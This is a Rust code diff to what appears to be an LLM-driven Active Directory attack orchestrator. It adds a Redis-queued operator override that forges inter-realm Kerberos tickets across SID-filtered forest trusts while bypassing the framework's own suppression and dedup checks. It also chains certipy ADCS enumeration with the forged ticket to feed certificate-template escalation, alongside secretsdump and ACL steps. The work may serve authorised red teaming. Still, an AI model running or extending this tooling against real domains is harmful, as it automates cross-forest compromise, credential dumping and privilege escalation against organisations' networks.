@@ -561,6 +561,10 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             );
         }
 
+        // Operator escape hatch: dispatch any force-inter-realm-forge requests
+        // queued via `ares ops force-inter-realm-forge` before the normal path.
+        drain_force_forge_requests(&dispatcher).await;
+
         // Auto-enumerate trusts when DA is achieved
         {
             let state = dispatcher.state.read().await;
@@ -2215,6 +2219,98 @@ async fn dispatch_post_ticket_acl_enumeration(
     }
 }
 
+/// Enumerate ADCS templates and CAs in the target forest with the forged
+/// inter-realm ticket.
+///
+/// The foreign CA rejects NTLM RPC (`ept_s_not_registered` /
+/// `rpc_s_access_denied`) across a SID-filtered trust, so the LLM's ADCS recon
+/// stalls there. certipy authenticates its LDAP + CA RPC over `-k -no-pass`
+/// (KRB5CCNAME) once the credential resolver injects `ticket_path` for the
+/// target realm — the certipy subset of Bug B, gated by
+/// `is_cross_forest_certipy_tool` and keyed off the `domain` argument set here.
+/// Running `certipy find` directly surfaces ESC1/2/3/4/9/13/15 templates into
+/// state so the ADCS automations (which now issue `certipy req` with the same
+/// ccache) have targets without waiting for another recon round.
+async fn dispatch_post_ticket_adcs_enumeration(
+    dispatcher: &Dispatcher,
+    source_domain: &str,
+    target_domain: &str,
+) {
+    let target_dc_ip = {
+        let s = dispatcher.state.read().await;
+        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
+            warn!(
+                source_domain,
+                target_domain, "post-ticket ADCS enum skipped: no DC IP for target domain"
+            );
+            return;
+        };
+        dc_ip
+    };
+
+    // `domain` = target forest so the resolver looks up the forged ccache under
+    // that realm (see `is_cross_forest_certipy_tool`). No password/hash is
+    // supplied: without an injected ticket certipy_find soft-skips rather than
+    // attempting a doomed cross-forest NTLM bind.
+    let tool_args = json!({
+        "domain": target_domain,
+        "dc_ip": target_dc_ip,
+        "username": "Administrator",
+    });
+    let call = ToolCall {
+        id: format!("post_ticket_adcs_{}", uuid::Uuid::new_v4().simple()),
+        name: "certipy_find".to_string(),
+        arguments: tool_args,
+    };
+    let task_id = format!(
+        "post_ticket_adcs_{}",
+        &uuid::Uuid::new_v4().simple().to_string()[..12]
+    );
+
+    info!(
+        task_id = %task_id,
+        source_domain,
+        target_domain,
+        "Post-ticket ADCS enumeration dispatched (certipy find via Kerberos ccache)"
+    );
+
+    match dispatcher
+        .llm_runner
+        .tool_dispatcher()
+        .dispatch_tool("privesc", &task_id, &call)
+        .await
+    {
+        Ok(exec) => {
+            if let Some(err) = exec.error {
+                warn!(
+                    err = %err,
+                    source_domain,
+                    target_domain,
+                    "Post-ticket ADCS enumeration returned tool error"
+                );
+                return;
+            }
+            let vuln_count = exec
+                .discoveries
+                .as_ref()
+                .and_then(|d| d.get("vulnerabilities"))
+                .and_then(|v| v.as_array())
+                .map(|v| v.len())
+                .unwrap_or(0);
+            info!(
+                source_domain,
+                target_domain, vuln_count, "Post-ticket ADCS enumeration completed"
+            );
+        }
+        Err(e) => warn!(
+            err = %e,
+            source_domain,
+            target_domain,
+            "Post-ticket ADCS enumeration dispatch failed"
+        ),
+    }
+}
+
 /// Forge an inter-realm Kerberos ticket for a SID-filtered cross-forest trust.
 ///
 /// Called from the suppression branch of `auto_trust_follow` when
@@ -2386,6 +2482,13 @@ async fn dispatch_create_inter_realm_ticket(
             dispatch_post_ticket_secretsdump(dispatcher, source_domain, target_domain).await;
 
             dispatch_post_ticket_acl_enumeration(dispatcher, source_domain, target_domain).await;
+
+            // Enumerate the foreign forest's CA over the same ccache. NTLM RPC
+            // to a cross-forest CA is rejected; `-k -no-pass` with the forged
+            // ticket is the only path that reaches it. Discovered ESC templates
+            // feed the ADCS automations, which now issue `certipy req` with the
+            // ccache too (Bug B, certipy subset).
+            dispatch_post_ticket_adcs_enumeration(dispatcher, source_domain, target_domain).await;
         }
         Err(e) => {
             tracing::warn!(
@@ -2395,6 +2498,89 @@ async fn dispatch_create_inter_realm_ticket(
                 "create_inter_realm_ticket dispatch error"
             );
         }
+    }
+}
+
+/// Drain operator escape-hatch inter-realm forge requests and dispatch each.
+///
+/// `ares ops force-inter-realm-forge` RPUSHes [`ForceInterRealmForgeRequest`]
+/// blobs onto `ares:op:{id}:force_forge_requests`. This runs at the top of
+/// every trust tick: it LPOPs pending requests, primes the target DC into
+/// state (so the forge can chain cifs/ + ldap/ service tickets even if the auto
+/// path never discovered it), then calls `dispatch_create_inter_realm_ticket`
+/// directly — bypassing the SID-filter suppression and trust_follow dedup that
+/// gate the automatic path. Bounded per tick so a flooded list can't starve the
+/// rest of the loop.
+async fn drain_force_forge_requests(dispatcher: &Dispatcher) {
+    use ares_core::models::ForceInterRealmForgeRequest;
+
+    let key = ares_core::state::build_key(
+        &dispatcher.config.operation_id,
+        ares_core::state::KEY_FORCE_FORGE_REQUESTS,
+    );
+    let mut conn = dispatcher.queue.connection();
+
+    for _ in 0..16 {
+        let raw: Option<String> = match redis::cmd("LPOP").arg(&key).query_async(&mut conn).await {
+            Ok(v) => v,
+            Err(e) => {
+                warn!(err = %e, "force_forge drain: LPOP failed");
+                return;
+            }
+        };
+        let Some(raw) = raw else {
+            return; // list drained
+        };
+        let request: ForceInterRealmForgeRequest = match serde_json::from_str(&raw) {
+            Ok(r) => r,
+            Err(e) => {
+                warn!(err = %e, raw = %raw, "force_forge drain: bad request JSON, skipping");
+                continue;
+            }
+        };
+
+        info!(
+            source_domain = %request.source_domain,
+            target_domain = %request.target_domain,
+            "Operator force-inter-realm-forge request dequeued — dispatching (bypasses SID-filter + dedup)"
+        );
+
+        // Prime the target DC in-memory so the forge's state read resolves it.
+        // Enough for the synchronous dispatch below; not persisted to Redis.
+        if let Some(ip) = request.target_dc_ip.as_deref() {
+            let mut state = dispatcher.state.write().await;
+            state
+                .domain_controllers
+                .entry(request.target_domain.to_lowercase())
+                .or_insert_with(|| ip.to_string());
+            if let Some(fqdn) = request.target_dc_fqdn.as_deref() {
+                let known = state
+                    .hosts
+                    .iter()
+                    .any(|h| h.ip == ip && h.hostname.eq_ignore_ascii_case(fqdn));
+                if !known {
+                    state.hosts.push(ares_core::models::Host {
+                        ip: ip.to_string(),
+                        hostname: fqdn.to_string(),
+                        os: String::new(),
+                        roles: Vec::new(),
+                        services: Vec::new(),
+                        is_dc: true,
+                        owned: false,
+                    });
+                }
+            }
+        }
+
+        dispatch_create_inter_realm_ticket(
+            dispatcher,
+            &request.source_domain,
+            &request.target_domain,
+            &request.trust_key,
+            request.aes_key.as_deref(),
+            request.source_sid.as_deref(),
+        )
+        .await;
     }
 }
 
